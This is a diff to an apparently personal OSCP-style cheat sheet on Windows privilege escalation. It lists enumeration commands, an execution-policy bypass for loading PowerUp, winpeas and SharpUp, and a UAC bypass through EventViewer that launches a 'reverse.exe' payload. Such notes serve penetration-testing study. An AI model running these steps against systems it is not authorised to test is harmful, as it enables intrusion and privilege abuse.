@@ -30,7 +30,7 @@
 
  # Privilege Escalation for Window
  reference: https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html
- 0. `whoami` `systeminfo` `whoami /priv` `whoami /groups' Conduct basic enumeration, and look for interesting files in the directory 
+ 0. `whoami` `systeminfo` `whoami /priv` `whoami /groups` Conduct basic enumeration, and look for interesting files in the directory\ 
  1. Transfer the file to Window to TMP directory using any of the above methods.
  2. Use PowerUp. `powershell -ep bypass`
  3. `Import-Module .\PowerUp.ps1` or `. .\PowerUp.ps1`
@@ -40,7 +40,7 @@
  7. `winpeas.exe`
  8. Use SharUp if you cant run winpeas or powerup 
  9. `.\SharpUp.exe`
- ## UAC 
+ ## UAC Bypass
  1. `powershell.exe Start-Process cmd.exe -Verb runAs` run cmd as high integrity,(this is the case when we have admin access to folder but cant execute admin)
  2. https://github.com/CsEnox/EventViewer-UACBypass
  3. `Invoke-EventViewer cmd.exe` or `Invoke-EventViewer "C:\full\path\to\reverse.exe`
